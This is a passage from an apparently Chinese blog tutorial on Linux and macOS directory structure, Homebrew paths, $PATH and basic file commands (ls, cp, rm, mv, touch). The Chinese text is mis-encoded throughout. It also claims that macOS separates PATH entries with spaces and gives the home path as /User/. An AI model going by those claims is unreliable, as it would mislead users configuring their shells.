å¯åŠ¨åçš„PID</td></tr><tr><td>&#x2F;var&#x2F;spool</td><td>æ’é˜Ÿç­‰å¾…å…¶ä»–åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ•°æ®ï¼Œä½¿ç”¨åé€šå¸¸è¢«åˆ é™¤</td></tr></tbody></table><hr><h3 id="macä¸‹æ ¹ç›®å½•ç»“æ„"><a href="#macä¸‹æ ¹ç›®å½•ç»“æ„" class="headerlink" title="macä¸‹æ ¹ç›®å½•ç»“æ„"></a>macä¸‹æ ¹ç›®å½•ç»“æ„</h3><p>macæ ¹ç›®å½•ä¸€èˆ¬æŒ‡<code>macintosh HD</code>,ä¸€èˆ¬æƒ…å†µä¸‹å¯è§çš„åªæœ‰4ä¸ªæ–‡ä»¶å¤¹Applicationsã€Libraryã€Systemã€Usersï¼Œæ˜¾ç¤ºéšè—æ–‡ä»¶å¤¹åå¯ä»¥çœ‹è§å®Œæ•´ç»“æ„</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2807nwmzlj21f40o8wh4.jpg"                      alt="image-20220514161710097" style="zoom: 50%;"                 ><figcaption>image-20220514161710097</figcaption></figure><p>å¯ä»¥å‘ç°å¤§éƒ¨åˆ†æ–‡ä»¶éƒ½ä¸Linuxä¸Šä¸€è‡´ï¼Œä¸åŒçš„æœ‰</p><table><thead><tr><th>ç›®å½•</th><th>å†…å®¹</th></tr></thead><tbody><tr><td>&#x2F;Applications</td><td>é»˜è®¤æ‰€æœ‰çš„GUIåº”ç”¨ç¨‹åºéƒ½å®‰è£…åœ¨è¿™é‡Œï¼Œä¹Ÿæ˜¯æˆ‘ä»¬ä½¿ç”¨dmgå®‰è£…ç¨‹åºæ—¶å‡ºç°åœ¨è®¿è¾¾æ¡†ä¸­çš„â€Applicationsæ›¿èº«â€çš„æœ¬ä½“</td></tr><tr><td>&#x2F;cores</td><td>å†…æ ¸è½¬å‚¨æ–‡(è¿›ç¨‹å´©æºƒæ—¶äº§ç”Ÿ)ä»¶å­˜æ”¾ç›®å½•</td></tr><tr><td>&#x2F;private</td><td>å­˜æ”¾äº†&#x2F;tmp, &#x2F;var, &#x2F;etcç­‰é“¾æ¥ç›®å½•çš„ç›®æ ‡ç›®å½•</td></tr><tr><td>&#x2F;Volumes</td><td>æ–‡ä»¶ç³»ç»ŸæŒ‚è½½ç‚¹å­˜æ”¾ç›®å½•</td></tr><tr><td>&#x2F;Library</td><td>ä¸­æ–‡ä¸‹ä¸ºâ€èµ„æºåº“â€ï¼Œå­˜æ”¾ç³»ç»Ÿçš„æ•°æ®æ–‡ä»¶ã€å¸®åŠ©æ–‡ä»¶ã€æ–‡æ¡£ç­‰ç­‰</td></tr><tr><td>&#x2F;Users</td><td>å­˜æ”¾ç”¨æˆ·çš„ä¸ªäººèµ„æ–™å’Œé…ç½®ã€‚æ¯ä¸ªç”¨æˆ·æœ‰è‡ªå·±çš„å•ç‹¬ç›®å½•ï¼Œé™¤æ­¤å¤–è¿˜æœ‰ä¸ªsharedç›®å½•</td></tr><tr><td>&#x2F;System</td><td>ä¸­å­˜æ”¾äº†ç³»ç»Ÿçš„ç»å¤§éƒ¨åˆ†ç»„ä»¶ï¼Œå¦‚å„ç§frameworkï¼Œä»¥åŠå†…æ ¸æ¨¡å—ï¼Œå­—ä½“æ–‡ä»¶ç­‰ç­‰ï¼Œæˆ‘ä»¬ä¼šå‘ç°å­ç›®å½•ä¸­ä¹Ÿæœ‰ä¸€ä¸ªApplicationsï¼Œé‡Œé¢å­˜æ”¾ç³»ç»Ÿè‡ªå¸¦GUIåº”ç”¨ç¨‹åº</td></tr></tbody></table><blockquote><p>macä¸‹çš„<code>~</code>æ˜¯å½“å‰ç”¨æˆ·çš„é¡¶çº§ç›®å½•ï¼ŒæŒ‡å‘<code>/User/å½“å‰ç”¨æˆ·å</code>ç›®å½•</p></blockquote><h4 id="x2F-usr-x2F-localä¸-x2F-opt"><a href="#x2F-usr-x2F-localä¸-x2F-opt" class="headerlink" title="&#x2F;usr&#x2F;localä¸&#x2F;opt"></a>&#x2F;usr&#x2F;localä¸&#x2F;opt</h4><p><code>homebrew</code>æ˜¯macä¸‹å¼ºå¤§çš„è½¯ä»¶åŒ…å·¥å…·(ç±»ä¼¼äºapt-get)ï¼Œå¯ä»¥è½»æ¾å®‰è£…ç»ˆç«¯å‘½ä»¤ã€æœåŠ¡(ä¾‹å¦‚Mysqlæ•°æ®åº“)ã€ç”šè‡³GUIåº”ç”¨ç¨‹åºç­‰ç­‰ã€‚è€Œé€šè¿‡å‘½ä»¤è¡Œå®‰è£…çš„homebrewé»˜è®¤æ”¾åœ¨&#x2F;optä¸‹ï¼Œé€šè¿‡homebrewå®‰è£…çš„å‘½ä»¤æˆ–æœåŠ¡éƒ½å­˜æ”¾åœ¨å…¶å­ç›®å½•Cellarä¸‹ã€‚è€Œå½“ä½ å»å®˜ç½‘ä¸­ä¸‹è½½å¯¹åº”çš„pkgå®‰è£…åŒ…å®‰è£…å„ç§æœåŠ¡æ—¶ï¼Œè¿™äº›æœåŠ¡é»˜è®¤æ”¾åœ¨&#x2F;usr&#x2F;localä¸‹</p><blockquote><p>å› æ­¤è§‚çœ‹åšå®¢æ—¶éœ€è¦è¾¨åˆ«å…¶ä¸­æœ¬åœ°å·²æœ‰æœåŠ¡çš„çœŸå®ä½ç½®ï¼Œå¯èƒ½å¤§å¤šæ•°æ•™ç¨‹çš„mysqlæ˜¯ä½¿ç”¨homebrewå®‰è£…ï¼Œå› æ­¤å®ƒçš„è·¯å¾„ä¸€èˆ¬ä¸º<code>/opt/homebrew/Cellar/mysql</code>ï¼Œä½†è‹¥ä½ æ˜¯å®˜ç½‘å®‰è£…çš„mysqlï¼Œè·¯å¾„åˆ™ä¸º<code>/usr/local/mysql</code> </p><h4 id="ğŸ’¡homebrewçš„ä¸€ä¸ªä½¿ç”¨æŠ€å·§ï¼š"><a href="#ğŸ’¡homebrewçš„ä¸€ä¸ªä½¿ç”¨æŠ€å·§ï¼š" class="headerlink" title="ğŸ’¡homebrewçš„ä¸€ä¸ªä½¿ç”¨æŠ€å·§ï¼š"></a>ğŸ’¡homebrewçš„ä¸€ä¸ªä½¿ç”¨æŠ€å·§ï¼š</h4><p>åœ¨<code>/opt/homebrew/Library/Taps/homebrew/homebrew-core/Formula</code>ç›®å½•ä¸‹å­˜å‚¨äº†è®¸å¤š.rbæ–‡ä»¶ï¼Œå¯¹åº”ç€å¯é€šè¿‡homebrewå®‰è£…çš„å·¥å…·æˆ–æœåŠ¡ï¼Œè€Œä¸ºäº†æ›´è½»ä¾¿ï¼Œhomebrewå¸¸å°†ä¸€ä¸ªå¤§å‹å·¥å…·çš„ä¸å¸¸ç”¨æ¨¡å—æˆ–é©±åŠ¨æ‰“åŒ…ç‹¬ç«‹å‡ºæ¥ï¼Œä»¥qtä¸ºä¾‹ï¼Œæ‰§è¡Œ<code>brew install qt</code>å®‰è£…çš„ä»…æ˜¯æœ€åŸºç¡€ç‰ˆæœ¬ï¼Œè‹¥éœ€è¦è¿æ¥mysqlçš„æœåŠ¡è¦æ‰§è¡Œ<code>brew install qt-mysql</code>ï¼Œè€Œè¿™äº›å¾€å¾€ä¸ä¼šå†™åœ¨å®˜æ–¹æ–‡æ¡£ä¸­ï¼Œå› æ­¤æˆ‘ä»¬è¦å­¦ä¹ å–„ç”¨Formulaç›®å½•ï¼Œé€šè¿‡æŸ¥æ‰¾å…³é”®è¯ï¼Œæ‰¾åˆ°éœ€è¦çš„æœåŠ¡ï¼Œå¯ä»¥èŠ‚çœå¾ˆå¤šç¯å¢ƒé…ç½®çš„æ—¶é—´</p></blockquote><h2 id="0x03-ç›®å½•ä¸è·¯å¾„"><a href="#0x03-ç›®å½•ä¸è·¯å¾„" class="headerlink" title="0x03 ç›®å½•ä¸è·¯å¾„"></a>0x03 ç›®å½•ä¸è·¯å¾„</h2><h3 id="ç›¸å¯¹è·¯å¾„ä¸ç»å¯¹è·¯å¾„"><a href="#ç›¸å¯¹è·¯å¾„ä¸ç»å¯¹è·¯å¾„" class="headerlink" title="ç›¸å¯¹è·¯å¾„ä¸ç»å¯¹è·¯å¾„"></a>ç›¸å¯¹è·¯å¾„ä¸ç»å¯¹è·¯å¾„</h3><p>ç›¸å¯¹è·¯å¾„ï¼šåˆ©ç”¨.ã€..ç­‰ç‰¹æ®Šç›®å½•æè¿°ç›¸å¯¹äºå½“å‰ç›®å½•çš„æ–‡ä»¶è·¯å¾„ e.g. <code>../test.txt</code></p><p>ç»å¯¹è·¯å¾„ï¼šä»æ ¹ç›®å½•&#x2F;å¼€å§‹å†™èµ·  e.g. <code>/Users/sloth/install.sh</code></p><h3 id="ç›®å½•ç›¸å…³æ“ä½œ"><a href="#ç›®å½•ç›¸å…³æ“ä½œ" class="headerlink" title="ç›®å½•ç›¸å…³æ“ä½œ"></a>ç›®å½•ç›¸å…³æ“ä½œ</h3><h4 id="ç‰¹æ®Šç›®å½•"><a href="#ç‰¹æ®Šç›®å½•" class="headerlink" title="ç‰¹æ®Šç›®å½•"></a>ç‰¹æ®Šç›®å½•</h4><ul><li><code>.</code> â€“å½“å‰ç›®å½• </li><li><code>..</code> â€“ä¸Šä¸€çº§ç›®å½•</li><li><code>-</code> â€“å‰ä¸€ä¸ªç›®å½•(<code>cd -</code>åŒæ—¶è¿˜ä¼šå›æ˜¾ä¸Šä¸€ä¸ªç›®å½•çš„è·¯å¾„(ä»~æˆ–æ ¹ç›®å½•&#x2F;å¼€å§‹çš„ç»å¯¹è·¯å¾„))</li><li><code>~</code> â€“å½“å‰ç”¨æˆ·ä¸»æ–‡ä»¶å¤¹</li><li><code>~example</code> â€“exampleç”¨æˆ·ä¸»æ–‡ä»¶å¤¹</li></ul><h4 id="å¤„ç†ç›®å½•çš„å‘½ä»¤"><a href="#å¤„ç†ç›®å½•çš„å‘½ä»¤" class="headerlink" title="å¤„ç†ç›®å½•çš„å‘½ä»¤"></a>å¤„ç†ç›®å½•çš„å‘½ä»¤</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ç›®å½•çš„ç»å¯¹è·¯å¾„/ç›¸å¯¹è·¯å¾„ # åˆ‡æ¢ç›®å½• change directory</span><br><span class="line">pwd [-P] # æ˜¾ç¤ºå½“å‰ç›®å½• -P:æ˜¾ç¤ºå®é™…ç›®å½•(åŸèº«)ï¼Œè€Œä¸æ˜¯è¿æ¥æ–‡ä»¶(æ›¿èº«)</span><br><span class="line">mkdir [-m æƒé™][-p] # æ–°å»ºç›®å½• -m:é…ç½®æƒé™  -p:åˆ›å»ºå¤šå±‚ç›®å½•</span><br><span class="line">rmdir [-p] # åˆ é™¤ä¸€ä¸ªç©ºç›®å½•(åˆ é™¤éç©ºç›®å½•ä¼šæŠ¥é”™)  -p:ä¸€æ¬¡æ€§åˆ é™¤å¤šå±‚ç©ºç›®å½• </span><br></pre></td></tr></table></figure></div><h3 id="ç¯å¢ƒå˜é‡-PATH"><a href="#ç¯å¢ƒå˜é‡-PATH" class="headerlink" title="ç¯å¢ƒå˜é‡$PATH"></a>ç¯å¢ƒå˜é‡$PATH</h3><p>$PATHçš„å€¼ä¸€èˆ¬æ˜¯å¤šä¸ªç›®å½•ä¸‹çš„é›†åˆï¼Œå½“å‰ç”¨æˆ·å¯ä»¥æ‰§è¡Œè¿™äº›ç›®å½•å­˜å‚¨çš„å‘½ä»¤ï¼ŒLinuxä¸‹è¿™äº›ç›®å½•ä»¥<code>:</code>åˆ†éš”ï¼Œè€Œmacä¸‹ä»¥ç©ºæ ¼åˆ†éš”</p><h4 id="æ‰§è¡Œéç¯å¢ƒå˜é‡ä¸­çš„å‘½ä»¤"><a href="#æ‰§è¡Œéç¯å¢ƒå˜é‡ä¸­çš„å‘½ä»¤" class="headerlink" title="æ‰§è¡Œéç¯å¢ƒå˜é‡ä¸­çš„å‘½ä»¤"></a>æ‰§è¡Œéç¯å¢ƒå˜é‡ä¸­çš„å‘½ä»¤</h4><p>å¯ä»¥é‡‡ç”¨å‘½ä»¤çš„ç»å¯¹è·¯å¾„æ¥æ‰§è¡Œ</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig eth0</span><br></pre></td></tr></table></figure></div><p>é‡‡ç”¨å‘½ä»¤æ·»åŠ </p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=&quot;$PATH&quot;:å‘½ä»¤è·¯å¾„    # ä¸€èˆ¬æ˜¯ä¸€ä¸ªbinæ–‡ä»¶ç›®å½•</span><br></pre></td></tr></table></figure></div><p>é…ç½®æ–‡ä»¶æ·»åŠ ï¼Œmacä¸‹ä¹Ÿæœ‰è®¸å¤šç¯å¢ƒå˜é‡ç›¸å…³é…ç½®æ–‡ä»¶,å¯ä»¥æ·»åŠ è¯­å¥</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:å‘½ä»¤è·¯å¾„</span><br></pre></td></tr></table></figure></div><blockquote><p>ä½¿ç”¨å‰è®°å¾—æ‰§è¡Œ</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source é…ç½®æ–‡ä»¶åè·¯å¾„</span><br></pre></td></tr></table></figure></div><p>æ³¨ï¼šå¦‚æœæœ‰ä¸¤ä¸ªç›¸åŒåå­—çš„å‘½ä»¤å­˜åœ¨PATHä¸­ï¼Œåˆ™æ‰§è¡ŒPATHå…ˆæŸ¥è¯¢åˆ°çš„ç›®å½•ä¸‹çš„å‘½ä»¤</p></blockquote><h2 id="0x04-æ–‡ä»¶ä¸ç›®å½•ç®¡ç†"><a href="#0x04-æ–‡ä»¶ä¸ç›®å½•ç®¡ç†" class="headerlink" title="0x04 æ–‡ä»¶ä¸ç›®å½•ç®¡ç†"></a>0x04 æ–‡ä»¶ä¸ç›®å½•ç®¡ç†</h2><h3 id="å¸¸è§æ–‡ä»¶-x2F-ç›®å½•æ“ä½œå‘½ä»¤"><a href="#å¸¸è§æ–‡ä»¶-x2F-ç›®å½•æ“ä½œå‘½ä»¤" class="headerlink" title="å¸¸è§æ–‡ä»¶&#x2F;ç›®å½•æ“ä½œå‘½ä»¤"></a>å¸¸è§æ–‡ä»¶&#x2F;ç›®å½•æ“ä½œå‘½ä»¤</h3><h4 id="lså‘½ä»¤â€“æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•"><a href="#lså‘½ä»¤â€“æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•" class="headerlink" title="lså‘½ä»¤â€“æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•"></a>lså‘½ä»¤â€“æŸ¥çœ‹æ–‡ä»¶ä¸ç›®å½•</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ls [options] ç›®å½•åç§°</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¸¸ç”¨option</span></span><br><span class="line">-a  æ˜¾ç¤ºå…¨éƒ¨åŒ…æ‹¬éšè—æ–‡ä»¶(è¿˜æ˜¾ç¤º.ä¸..)</span><br><span class="line">-d  ä»…åˆ—å‡ºç›®å½•æœ¬èº«(.)ä¸€èˆ¬è¦æ­é…å…¶ä»–optionä¸€èµ·ä½¿ç”¨</span><br><span class="line">-l  æ‰“å°è¡¨ç¤ºæ–‡ä»¶å±æ€§ã€æƒé™çš„å­—ç¬¦ä¸²</span><br><span class="line">-A  åŒ-a ï¼Œä½†ä¸åˆ—å‡º &quot;.&quot; åŠ &quot;..&quot;</span><br><span class="line">-F  åœ¨åˆ—å‡ºçš„æ–‡ä»¶åç§°ååŠ ä¸€ç¬¦å·æ ‡è¯† ä¾‹å¦‚å¯æ‰§è¡Œæ¡£åˆ™åŠ  &quot;*&quot;, ç›®å½•åˆ™åŠ  &quot;/&quot;, sockertåŠ &quot;=&quot;,FIFOæ–‡ä»¶åŠ &quot;|&quot;</span><br><span class="line">-R  è¿åŒå­ç›®å½•ä¸‹æ–‡ä»¶ä¾åºåˆ—å‡º</span><br><span class="line">-r  å°†æ–‡ä»¶ä»¥ç›¸åæ¬¡åºæ˜¾ç¤º(åŸå®šä¾è‹±æ–‡å­—æ¯æ¬¡åº)</span><br><span class="line">-t  å°†æ–‡ä»¶ä¾å»ºç«‹æ—¶é—´ä¹‹å…ˆåæ¬¡åºåˆ—å‡º</span><br><span class="line">-n  åˆ—å‡ºUIDä¸GID</span><br></pre></td></tr></table></figure></div><h4 id="cpå‘½ä»¤â€“å¤åˆ¶"><a href="#cpå‘½ä»¤â€“å¤åˆ¶" class="headerlink" title="cpå‘½ä»¤â€“å¤åˆ¶"></a>cpå‘½ä»¤â€“å¤åˆ¶</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cp [options] source1 source2 â€¦â€¦ destination</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¸¸ç”¨å‚æ•°</span></span><br><span class="line">-d  è‹¥æºæ–‡ä»¶ä¸ºè¿æ¥æ–‡ä»¶ï¼Œåˆ™å¤åˆ¶è¿æ¥å±æ€§</span><br><span class="line">-p  è¿åŒæ–‡ä»¶çš„å±æ€§ä¸€èµ·å¤åˆ¶è¿‡å»ï¼Œè€Œéä½¿ç”¨é»˜è®¤å±æ€§(å¤‡ä»½å¸¸ç”¨)</span><br><span class="line">-r  é€’å½’æŒç»­å¤åˆ¶</span><br><span class="line">-a  ç›¸å½“äºä¸Šé¢æåˆ°çš„ä¸‰ä¸ªoptionsä¸€èµ·ç”¨(-pdr)</span><br><span class="line">-i  è‹¥ç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨æ—¶ï¼Œåœ¨è¦†ç›–æ—¶ä¼šå…ˆè¯¢é—®åŠ¨ä½œçš„è¿›è¡Œ</span><br><span class="line">-u  ç”¨äºæ›´æ–°ï¼Œè‹¥destinationæ¯”sourceæ—§æ‰å‡çº§destination</span><br><span class="line">-f  ä¸ºå¼ºåˆ¶(force)çš„æ„æ€ï¼Œè‹¥ç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨ä¸”æ— æ³•å¼€å¯ï¼Œåˆ™ç§»é™¤åå†å°è¯•ä¸€æ¬¡</span><br><span class="line">-l  å»ºç«‹ç¡¬è¿æ¥</span><br><span class="line">-s  å¤åˆ¶ä¸ºç¬¦å·è¿æ¥æ–‡ä»¶ è½¯è¿æ¥</span><br></pre></td></tr></table></figure></div><blockquote><p>sourceæœ‰ä¸¤ä¸ªåŠä»¥ä¸Šæ—¶ï¼Œç›®æ ‡æ–‡ä»¶å¿…é¡»æ˜¯ç›®å½•</p></blockquote><h4 id="rmå‘½ä»¤â€“ç§»é™¤"><a href="#rmå‘½ä»¤â€“ç§»é™¤" class="headerlink" title="rmå‘½ä»¤â€“ç§»é™¤"></a>rmå‘½ä»¤â€“ç§»é™¤</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm [options] æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å¸¸ç”¨options</span></span><br><span class="line">-f  å¼ºåˆ¶ç§»é™¤ï¼Œå¿½ç•¥ä¸å­˜åœ¨æ–‡ä»¶ï¼Œä¸å‡ºç°è­¦å‘Š</span><br><span class="line">-i  äº’åŠ¨æ¨¡å¼ï¼Œåˆ é™¤å‰è¯¢é—®</span><br><span class="line">-r  é€’å½’åˆ é™¤</span><br></pre></td></tr></table></figure></div><blockquote><ul><li>åˆ é™¤æ–‡ä»¶åä»¥<code>-</code>å¼€å¤´æ–‡ä»¶ï¼Œç”±äºç›´æ¥åˆ é™¤ä¼šè¢«ç³»ç»Ÿè¯¯åˆ¤ä¸ºoptionï¼Œå› æ­¤åªè¦åŠ ä¸Š<code>./</code></li></ul><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm ./-example</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æˆ–</span></span><br><span class="line">rm -- -example</span><br></pre></td></tr></table></figure></div><ul><li><p>æ²¡æœ‰optionsæ—¶ï¼Œç›´æ¥rmæ˜¯æ— æ³•åˆ é™¤ç›®å½•çš„,ä¸€å®šè¦-r</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -r ç›®å½•</span><br></pre></td></tr></table></figure></div></li></ul></blockquote><h4 id="mvå‘½ä»¤â€“ç§»åŠ¨æˆ–æ›´å"><a href="#mvå‘½ä»¤â€“ç§»åŠ¨æˆ–æ›´å" class="headerlink" title="mvå‘½ä»¤â€“ç§»åŠ¨æˆ–æ›´å"></a>mvå‘½ä»¤â€“ç§»åŠ¨æˆ–æ›´å</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mv [options] source1 source2 â€¦â€¦ destination</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‚æ•°</span></span><br><span class="line">-f  ä¸è¯¢é—®ç›´æ¥è¦†ç›–</span><br><span class="line">-i  è¦†ç›–å‰è¯¢é—®</span><br><span class="line">-u  æ›´æ–°ï¼Œsourceæ¯”destinationæ–°æ‰ä¼šæ›´æ–°</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">é‡å‘½åæ“ä½œ</span></span><br><span class="line">mv old_name new_name   # å¤„äºåŒä¸€ç›®å½•ä¸‹</span><br></pre></td></tr></table></figure></div><blockquote><p>mvç§»åŠ¨é»˜è®¤åˆ é™¤åŸæ–‡ä»¶</p></blockquote><h4 id="åˆ©ç”¨ä»¥ä¸Šå‘½ä»¤å®ç°æ–‡ä»¶ç§»åŠ¨æ–°ç›®å½•ï¼Œä¸åˆ é™¤åŸæ–‡ä»¶"><a href="#åˆ©ç”¨ä»¥ä¸Šå‘½ä»¤å®ç°æ–‡ä»¶ç§»åŠ¨æ–°ç›®å½•ï¼Œä¸åˆ é™¤åŸæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨ä»¥ä¸Šå‘½ä»¤å®ç°æ–‡ä»¶ç§»åŠ¨æ–°ç›®å½•ï¼Œä¸åˆ é™¤åŸæ–‡ä»¶"></a>åˆ©ç”¨ä»¥ä¸Šå‘½ä»¤å®ç°æ–‡ä»¶ç§»åŠ¨æ–°ç›®å½•ï¼Œä¸åˆ é™¤åŸæ–‡ä»¶</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp source1 source1_1</span><br><span class="line">cd æ–°è·¯å¾„</span><br><span class="line">mkdir æ–°ç›®å½•</span><br><span class="line">mv source1_1å®Œæ•´è·¯å¾„ æ–°ç›®å½•</span><br></pre></td></tr></table></figure></div><h4 id="basenameä¸dirname"><a href="#basenameä¸dirname" class="headerlink" title="basenameä¸dirname"></a>basenameä¸dirname</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">basename è·¯å¾„  # è¿”å›æ–‡ä»¶å</span><br><span class="line">dirname è·¯å¾„   # è¿”å›ç›®å½•å</span><br></pre></td></tr></table></figure></div><h3 id="æ–‡ä»¶å†…å®¹æŸ¥é˜…å‘½ä»¤"><a href="#æ–‡ä»¶å†…å®¹æŸ¥é˜…å‘½ä»¤" class="headerlink" title="æ–‡ä»¶å†…å®¹æŸ¥é˜…å‘½ä»¤"></a>æ–‡ä»¶å†…å®¹æŸ¥é˜…å‘½ä»¤</h3><ul><li>cat ï¼šä»ç¬¬ä¸€è¡Œå¼€å§‹</li><li>tac ï¼šä»æœ€åä¸€è¯å¼€å§‹</li><li>nlï¼šæ˜¾ç¤ºæ—¶åˆ—å‡ºè¡Œå·</li><li>moreï¼šä¸€é¡µé¡µæ˜¾ç¤º</li><li>lessï¼šä¸moreç±»ä¼¼ï¼Œä½†å¯ä»¥å¾€å‰ç¿»</li><li>headï¼šåªçœ‹å¤´å‡ è¡Œ</li><li>tailï¼šåªçœ‹ç»“å°¾å‡ è¡Œ</li><li>odï¼šäºŒè¿›åˆ¶æ–¹å¼è¯»å–</li></ul><h3 id="ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ–åˆ›å»ºæ–‡ä»¶â€“touch"><a href="#ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ–åˆ›å»ºæ–‡ä»¶â€“touch" class="headerlink" title="ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ–åˆ›å»ºæ–‡ä»¶â€“touch"></a>ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ–åˆ›å»ºæ–‡ä»¶â€“touch</h3><h4 id="ä¸‰ä¸ªå˜åŠ¨æ—¶é—´"><a href="#ä¸‰ä¸ªå˜åŠ¨æ—¶é—´" class="headerlink" title="ä¸‰ä¸ªå˜åŠ¨æ—¶é—´"></a>ä¸‰ä¸ªå˜åŠ¨æ—¶é—´</h4><ul><li>mtime :æ–‡ä»¶å†…å®¹æ•°æ®(ä¸åŒ…æ‹¬å±æ€§ã€æƒé™)æ›´æ”¹æ—¶æ›´æ–°</li><li>ctime :æ–‡ä»¶çŠ¶æ€(å±æ€§æƒé™ç­‰)æ”¹å˜æ—¶æ›´æ–°(cpæ—¶æ— æ³•å¤åˆ¶çš„å±æ€§)</li><li>atime :æ–‡ä»¶å†…å®¹è¢«å–ç”¨æ—¶(å¦‚ç”¨catè¯»å–)æ—¶æ›´æ–°</li></ul><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">touch [options] æ–‡ä»¶</span><br><span class="line">-a  ä»…ä¿®æ”¹è®¿é—®æ—¶é—´</span><br><span class="line">-c  ä»…ä¿®æ”¹æ–‡ä»¶æ—¶é—´ï¼Œè‹¥æ–‡ä»¶ä¸å­˜åœ¨åˆ™æ–°å»º</span><br><span class="line">-d  åæ¥æ—¥æœŸ(ä¸åŒäºå½“å‰)ï¼ŒåŒ --date=&quot;æ—¥æœŸæˆ–æ—¶é—´&quot;</span><br><span class="line">-m  ä»…ä¿®æ”¹mtime</span><br><span class="line">-t  åæ¥æ—¶é—´(ä¸åŒäºå½“å‰)ï¼Œæ ¼å¼ä¸º[YYMMDDhhmm]</span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥é€šè¿‡<code>touch+æ–‡ä»¶å</code>åœ¨å½“å‰ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ³¨æ„ä¸mkdiråŒºåˆ†(æ–°å»ºç›®å½•)</p><p>ä¹Ÿå¯ä»¥é€šè¿‡<code>touch+æ–‡ä»¶å</code>å°†æ–‡ä»¶æ—¶é—´(mtimeã€atime)ä¿®æ”¹åˆ°ç°åœ¨</p></blockquote><h2 id="0x05-æ–‡ä»¶ä¸ç›®å½•çš„é»˜è®¤æƒé™ä¸éšè—æƒé™"><a href="#0x05-æ–‡ä»¶ä¸ç›®å½•çš„é»˜è®¤æƒé™ä¸éšè—æƒé™" class="headerlink" title="0x05 æ–‡ä»¶ä¸ç›®å½•çš„é»˜è®¤æƒé™ä¸éšè—æƒé™"></a>0x05 æ–‡ä»¶ä¸ç›®å½•çš„é»˜è®¤æƒé™ä¸éšè—æƒé™</h2><h3 id="æ–‡ä»¶é»˜è®¤æƒé™ï¼šumask"><a href="#æ–‡ä»¶é»˜è®¤æƒé™ï¼šumask" class="headerlink" 